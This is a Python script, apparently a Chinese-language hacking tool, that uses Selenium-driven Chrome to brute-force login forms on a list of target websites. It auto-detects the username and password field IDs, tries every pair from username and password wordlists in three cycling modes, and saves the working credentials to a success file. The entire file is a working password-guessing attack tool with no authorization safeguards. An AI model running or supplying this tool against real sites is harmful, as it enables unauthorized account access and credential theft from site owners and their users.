#coding:utf-8
#Author:LSA
#Data:20207114

from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import *

old_size = 0
list_num = []#这个list只是个计数器，我没用声明全局变量的方法，太麻烦了
list_element_username = ['username','user','email','name','login_user','id_username']
list_element_password = ['password','passwd','pass','pwd','login_pwd','id_password']


#在爆破前用于检测元素是否可以被找到
def check_username(target):
	for ele_username in list_element_username:
		print('正在查找用户名的元素名称:'+ele_username)
		try:
			browser.get(target)
			wait = WebDriverWait(browser, 3)
			wait.until(EC.presence_of_element_located((By.ID, ele_username)))
			check = ele_username
			break
		except TimeoutException:
			 check = 'false'
		# except:#遇到其他异常抛出异常，用于调试，后面稳定版会去掉
		# 	raise
	return check

#在爆破开始前用于检测元素是否可以被找到
def check_password(target):
	for ele_password in list_element_password:
		print('正在查找密码的元素名称:'+ele_password)
		try:
			browser.get(target)
			wait = WebDriverWait(browser, 3)
			wait.until(EC.presence_of_element_located((By.ID, ele_password)))
			check = ele_password
			break
		except TimeoutException:
			check = 'false'
		# except:  # 遇到其他异常抛出异常，用于调试，后面稳定版会去掉
		# 	raise
	return check

def Login(user,pwd,target,ele_user,ele_pwd):
	print('正在测试'+target)
	print(user)
	print(pwd)
	try:
		browser.get(target)
		wait = WebDriverWait(browser, 5)
		username = wait.until(EC.presence_of_element_located((By.ID, ele_user)))
		username.send_keys(user)
		password = wait.until(EC.presence_of_element_located((By.ID, ele_pwd)))
		password.send_keys(pwd)
		password.send_keys(Keys.ENTER)
		# time.sleep(0.5)
		print(browser.page_source)
		global old_size
		if old_size == 0:
			old_size += len(browser.page_source)
		elif (len(browser.page_source) > old_size) or (len(browser.page_source) < old_size):
			try:
				wait.until(EC.presence_of_element_located((By.ID, ele_user)))
				wait.until(EC.presence_of_element_located((By.ID, ele_pwd)))
			except TimeoutException:
				with open('success.txt', 'a+', encoding='utf-8') as f:
					f.write('网址：' + target + '用户名:' + user + '密码:' + pwd + '\n')
					print('爆破成功！')
		else:
			old_size = len(browser.page_source)
			print(old_size)
	except UnexpectedAlertPresentException:
		print('UnexpectedAlertPresentException异常，驱动设置cookie失败')
	except TimeoutException:
		list_num.append('1')
		print('TimeoutException异常，没有找到元素,第'+str(len(list_num))+'次异常')
		with open('error.txt', 'a+', encoding='utf-8')as f:
			f.write(target + '\n')


def start_chrom():
    print('[+] 正在后台打开谷歌浏览器...')
    chrome_option = Options()
    chrome_option.add_argument('blink-settings=imagesEnabled=false')
    # chrome_option.add_argument('--headless')
    chrome_option.add_experimental_option('excludeSwitches', ['enable-logging'])  # 关闭控制台日志
    browser = webdriver.Chrome(executable_path="./chromedriver.exe", chrome_options=chrome_option)
    browser.set_page_load_timeout(500)
    print('[+] 正在爆破中，请稍等 ~')
    return browser

def brute_target():
	target_list = []
	with open('target.txt','r',encoding='utf-8') as f:
		for url in f.readlines():
			target_list.append(url.strip())
	target_list = list(filter(None, target_list))
	return target_list

def ready_user():
    user_queue = []
    with open('./username.txt','r') as fuser:
        for user in fuser.readlines():
            user_queue.append(user.strip())
    return user_queue

def ready_pass():
    passwd_queue = []
    with open('./pass.txt','r') as fpass:
        for pwd in fpass.readlines():
            passwd_queue.append(pwd.strip())
    return passwd_queue

def start_brute(brute_mode,target,ele_user,ele_pwd):
	if brute_mode == '1':
		user_list = ready_user()
		passwd_list = ready_pass()
		while len(user_list) != 0:
			u = user_list.pop(0)
			for p in passwd_list:
				Login(u,p,target,ele_user,ele_pwd)
				if len(list_num) == 3:
					list_num.clear()
					print('异常次数超过三次，正在结束本次任务')
					return
	if brute_mode == '2':
		user_list = ready_user()
		passwd_list = ready_pass()
		while len(passwd_list) != 0:
			p = passwd_list.pop(0)
			for u in user_list:
				Login(u,p,target,ele_user,ele_pwd)
				if len(list_num) == 3:
					list_num.clear()
					print('异常次数超过三次，正在结束本次任务')
					return
	if brute_mode == '3':
		user_list = ready_user()
		passwd_list = ready_pass()
		while len(user_list) != 0 and len(passwd_list) != 0:
			u =user_list.pop(0)
			p = passwd_list.pop(0)
			Login(u,p,target,ele_user,ele_pwd)
			if len(list_num) == 3:
				list_num.clear()
				print('异常次数超过三次，正在结束本次任务')
				return

if __name__ == '__main__':
	num_list = ['1','2','3']
	brute_mode = input("[+] 请输入爆破模式，1、单用户内密码循环爆破 2、单密码内多用户循环爆破 3、用户和密码按每行顺序爆破")
	if brute_mode not in num_list:
		print("[+] 输入错误，只能输入1、2、3这三个数字\n")
	else:
		browser = start_chrom()
		target_list = brute_target()
		while len(target_list) != 0 :
			target = target_list.pop(0)
			try:
				ele_user = check_username(target)
				if ele_user == 'false':
					print('用户名元素未找到，已经跳过任务')
					continue
				ele_pwd	= check_password(target)
				if ele_pwd == 'false':
					print('密码元素未找到，已经跳过任务')
					continue
				print('用户名元素名称为：'+ele_user+'\n密码元素名称为：'+ele_pwd)
				start_brute(brute_mode,target,ele_user,ele_pwd)
			except Exception as e:
				if 'ERR_CONNECTION_TIMED_OUT' in str(e):
					print('域名访问失败，已跳过任务')
		browser.quit()
		print("[+] 爆破结束，正在关闭浏览器，请稍等")